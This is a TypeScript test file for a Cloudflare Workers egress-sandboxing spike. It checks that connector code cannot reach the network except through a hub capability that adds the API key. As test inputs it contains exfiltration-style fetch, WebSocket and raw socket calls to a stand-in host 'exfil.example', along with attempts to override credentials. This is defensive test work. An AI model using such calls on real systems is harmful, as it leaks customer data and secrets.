// M4-P0 (N50): can a connector we build run so its own direct fetch fails and only the hub's controlled call works?
// Shape 1: the connector's code in a Dynamic Worker the hub loads with globalOutbound: null, plus one capability.
// Shape 1b: the same, with the hub's gate as globalOutbound instead (the connector's plain fetch goes through the gate).
// Shape 2: the connector as its own Worker behind a service binding.
// The fixture worker stands in for the internet; its log shows whatever actually left.
import { env } from 'cloudflare:test'
import { exports } from 'cloudflare:workers'
import { beforeEach, describe, expect, it } from 'vitest'
import { Outbound, type Grant } from './hub'

type Log = { entries(): Promise<{ host: string; path: string; method: string; auth: string | null }[]>; clear(): Promise<void> }
const E = env as unknown as {
  LOADER: WorkerLoader
  FIXTURE_LOG: Log
  CONNECTOR: { direct(url: string): Promise<{ status: number; body: string }> }
}
const gateways = exports as unknown as { EgressGate: (opts: { props: Grant }) => Fetcher }

const ITEMS = 'https://api.fixture.test/items'
const readGrant = (over: Partial<Grant> = {}): Grant => ({
  connectionId: 'conn-a', generation: 3, tool: 'list_items', mode: 'read', hosts: ['api.fixture.test'], ...over,
})

let n = 0
/** Loads `body` as a connector's `run(out)` in a fresh Dynamic Worker and calls it. Errors come back as text. */
async function runConnector(body: string, outbound: Fetcher | null | undefined, cap?: Outbound): Promise<string> {
  const code: WorkerLoaderWorkerCode = {
    compatibilityDate: '2026-11-11',
    mainModule: 'connector.js',
    modules: {
      'connector.js': `import { WorkerEntrypoint } from 'cloudflare:workers'
export class Connector extends WorkerEntrypoint {
  async run(out) {
    try { return JSON.stringify(await (async () => { ${body} })()) }
    catch (e) { return 'threw: ' + e.name + ': ' + e.message }
  }
}
export default { fetch() { return new Response(null, { status: 404 }) } }`,
    },
    env: {},
  }
  if (outbound !== undefined) code.globalOutbound = outbound
  const w = E.LOADER.get(`spike-${++n}`, () => code)
  const entry = w.getEntrypoint('Connector') as unknown as { run(out?: unknown): Promise<string> }
  return entry.run(cap)
}

beforeEach(async () => {
  await E.FIXTURE_LOG.clear()
})

describe('control: the stand-in internet is reachable', () => {
  it('a Dynamic Worker with globalOutbound left out reaches the fixture directly (default is open)', async () => {
    const r = await runConnector(`return (await fetch('${ITEMS}')).status`, undefined)
    expect(r).toBe('401')
    expect(await E.FIXTURE_LOG.entries()).toEqual([{ host: 'api.fixture.test', path: '/items', method: 'GET', auth: null }])
  })
})

describe('shape 1: Dynamic Worker, globalOutbound: null, one capability', () => {
  for (const [label, body] of [
    ['fetch to the tool host', `return (await fetch('${ITEMS}')).status`],
    ['fetch to another host', `return (await fetch('https://exfil.example/x?d=1')).status`],
    ['fetch with a Request object', `return (await fetch(new Request('${ITEMS}', { method: 'POST', body: 'x' }))).status`],
    ['connect()', `const { connect } = await import('cloudflare:sockets'); const s = connect('api.fixture.test:443'); await s.opened; return 'open'`],
    [
      'WebSocket',
      `const ws = new WebSocket('wss://exfil.example/'); return await Promise.race([new Promise((ok, no) => { ws.addEventListener('open', () => ok('open')); ws.addEventListener('error', () => no(new Error('ws error'))) }), new Promise(ok => setTimeout(() => ok('no event in 2 s'), 2000))])`,
    ],
  ] as const) {
    it(`direct ${label} fails and nothing leaves`, async () => {
      const r = await runConnector(body, null, new Outbound(readGrant()))
      expect(r).toMatch(/^threw: /)
      expect(await E.FIXTURE_LOG.entries()).toEqual([])
    })
  }

  it("the hub's capability call succeeds, with the key attached by the hub", async () => {
    const r = await runConnector(`return await out.fetch('${ITEMS}')`, null, new Outbound(readGrant()))
    expect(JSON.parse(r)).toEqual({ status: 200, body: JSON.stringify({ items: [{ id: 1, name: 'widget' }] }) })
    expect(await E.FIXTURE_LOG.entries()).toEqual([{ host: 'api.fixture.test', path: '/items', method: 'GET', auth: 'Bearer spike-key-a-7f3c' }])
    expect(r).not.toContain('spike-key')
  })

  it('the capability refuses a host off the list; nothing leaves', async () => {
    const r = await runConnector(`return await out.fetch('https://exfil.example/x')`, null, new Outbound(readGrant()))
    expect(JSON.parse(r)).toEqual({ status: 403, body: 'host_not_allowed:exfil.example' })
    expect(await E.FIXTURE_LOG.entries()).toEqual([])
  })

  it('a read grant refuses POST; nothing leaves', async () => {
    const r = await runConnector(`return await out.fetch('${ITEMS}', { method: 'POST', body: '{}' })`, null, new Outbound(readGrant()))
    expect(JSON.parse(r)).toEqual({ status: 403, body: 'method_not_allowed:POST' })
    expect(await E.FIXTURE_LOG.entries()).toEqual([])
  })

  it("the connector can't override the key, name another connection or read the grant", async () => {
    const r = await runConnector(
      `const probe = async p => { try { const v = await p; return v === undefined ? 'undefined' : 'value:' + JSON.stringify(v) } catch (e) { return 'threw' } }
       const res = await out.fetch('${ITEMS}', { headers: { Authorization: 'Bearer stolen' }, connectionId: 'conn-b' })
       return [res.status, await probe(out.grant), await probe(out.connectionId)]`,
      null,
      new Outbound(readGrant()),
    )
    const [status, grant, conn] = JSON.parse(r) as [number, string, string]
    expect(status).toBe(200)
    expect(grant).not.toMatch(/^value:/)
    expect(conn).not.toMatch(/^value:/)
    expect((await E.FIXTURE_LOG.entries()).map(e => e.auth)).toEqual(['Bearer spike-key-a-7f3c'])
    expect(r).not.toContain('spike-key')
  })

  it('the env the connector sees is empty', async () => {
    expect(await runConnector(`return Object.keys(this.env)`, null, new Outbound(readGrant()))).toBe('[]')
  })
})

describe('shape 1b: Dynamic Worker, globalOutbound = the hub gate (props set by the hub)', () => {
  const gate = () => gateways.EgressGate({ props: readGrant() })

  it("the connector's plain fetch to the tool host goes through the gate and gets the key", async () => {
    const r = await runConnector(`const res = await fetch('${ITEMS}'); return [res.status, await res.text()]`, gate())
    expect(JSON.parse(r)[0]).toBe(200)
    expect(await E.FIXTURE_LOG.entries()).toEqual([{ host: 'api.fixture.test', path: '/items', method: 'GET', auth: 'Bearer spike-key-a-7f3c' }])
  })

  it('another host is refused by the gate; nothing leaves', async () => {
    const r = await runConnector(`const res = await fetch('https://exfil.example/x'); return [res.status, await res.text()]`, gate())
    expect(JSON.parse(r)).toEqual([403, 'host_not_allowed:exfil.example'])
    expect(await E.FIXTURE_LOG.entries()).toEqual([])
  })

  it('connect() does not get past the gate', async () => {
    const r = await runConnector(
      `const { connect } = await import('cloudflare:sockets'); const s = connect('exfil.example:443'); await s.opened; const w = s.writable.getWriter(); await w.write(new TextEncoder().encode('GET / HTTP/1.1\\r\\nHost: exfil.example\\r\\n\\r\\n')); return 'wrote'`,
      gate(),
    )
    expect(r).toMatch(/^threw: /)
    expect(await E.FIXTURE_LOG.entries()).toEqual([])
  })
})

describe('shape 2: a connector Worker over a service binding', () => {
  it("its direct fetch reaches any host (nothing in a normal Worker's config blocks it)", async () => {
    const r = await E.CONNECTOR.direct('https://exfil.example/x?d=customer-data')
    expect(r).toEqual({ status: 200, body: 'reached exfil.example' })
    expect(await E.FIXTURE_LOG.entries()).toEqual([{ host: 'exfil.example', path: '/x', method: 'GET', auth: null }])
  })
})
